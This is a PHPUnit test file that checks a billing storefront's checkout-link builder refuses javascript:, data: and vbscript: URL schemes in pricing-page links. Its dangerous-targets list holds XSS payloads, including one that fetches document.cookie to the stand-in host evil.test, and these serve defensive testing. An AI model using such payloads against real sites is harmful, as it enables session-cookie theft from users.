<?php

declare(strict_types=1);

namespace Tests\Unit;

use App\Billing\Storefront\CheckoutLinkBuilder;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;

/**
 * A pricing table's CTA target is rendered into an `href` on the PUBLIC, unauthenticated pricing
 * page and its embed — both served from the billing origin, the same origin as the operator
 * console and the hosted checkout. Blade escapes HTML entities, but a URL scheme contains none,
 * so `javascript:` survives escaping intact. These tests pin the scheme allow-list at the render
 * seam; the console's write path shares the same predicate so it refuses at save time too.
 */
class CheckoutLinkSchemeTest extends TestCase
{
    private const FALLBACK = 'https://app.example.test/checkout';

    /**
     * @return list<array{0: string}>
     */
    public static function dangerousTargets(): array
    {
        return [
            ['javascript:alert(1)'],
            ["javascript:fetch('//evil.test/'+document.cookie)//"],
            ['JavaScript:alert(1)'],
            ['  javascript:alert(1)'],
            ['data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='],
            ['vbscript:msgbox(1)'],
            ['javascript:void(0)?plan={plan}'],
        ];
    }

    /**
     * @return list<array{0: string}>
     */
    public static function safeTargets(): array
    {
        return [
            ['https://app.example.test/signup'],
            ['http://localhost:8000/signup'],
            ['/signup'],
            ['/signup?plan={plan}'],
            ['//cdn.example.test/signup'],
            ['https://app.example.test/signup?plan={plan}&currency={currency}'],
        ];
    }

    #[DataProvider('dangerousTargets')]
    public function test_a_dangerous_scheme_is_refused(string $target): void
    {
        $this->assertFalse(CheckoutLinkBuilder::isSafeTarget($target));
    }

    #[DataProvider('safeTargets')]
    public function test_a_http_or_relative_target_is_allowed(string $target): void
    {
        $this->assertTrue(CheckoutLinkBuilder::isSafeTarget($target));
    }

    /**
     * The render seam must not emit the dangerous target even if one reached the database by a
     * route that bypassed the console validator — an import, a seeder, a direct write.
     */
    #[DataProvider('dangerousTargets')]
    public function test_the_builder_falls_back_rather_than_emitting_a_dangerous_href(string $target): void
    {
        $built = (new CheckoutLinkBuilder(self::FALLBACK))
            ->build($target, 'business', 'DKK', 'month', 49900);

        $this->assertStringStartsWith(self::FALLBACK, $built);
        $this->assertStringNotContainsStringIgnoringCase('javascript:', $built);
        $this->assertStringNotContainsStringIgnoringCase('data:', $built);
        $this->assertStringNotContainsStringIgnoringCase('vbscript:', $built);
    }

    /** A legitimate template still substitutes its placeholders exactly as before. */
    public function test_a_safe_template_still_builds_normally(): void
    {
        $built = (new CheckoutLinkBuilder(self::FALLBACK))
            ->build('https://app.example.test/signup?plan={plan}&cur={currency}', 'business', 'DKK', 'month', 49900);

        $this->assertSame('https://app.example.test/signup?plan=business&cur=DKK', $built);
    }

    /** With no template at all, the configured default is still used. */
    public function test_an_absent_template_uses_the_configured_default(): void
    {
        $built = (new CheckoutLinkBuilder(self::FALLBACK))
            ->build(null, 'business', 'DKK', 'month', 49900);

        $this->assertStringStartsWith(self::FALLBACK.'?', $built);
        $this->assertStringContainsString('plan=business', $built);
    }
}
